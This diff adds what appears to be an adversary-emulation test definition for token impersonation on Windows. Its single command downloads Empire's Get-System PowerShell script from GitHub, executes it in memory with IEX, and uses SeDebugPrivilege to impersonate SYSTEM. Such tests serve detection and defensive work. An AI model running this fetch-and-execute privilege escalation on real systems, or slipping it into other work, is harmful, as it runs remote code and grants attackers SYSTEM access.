@@ -1,0 +1,7 @@
+#TechniqueName: Access Token Manipulation: Token Impersonation/Theft
+#AtomicTestName: `SeDebugPrivilege` token duplication
+#Description: Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.&When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).
+#Language: ps1
+
+#commands
+IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1'); Get-System -Technique Token -Verbose
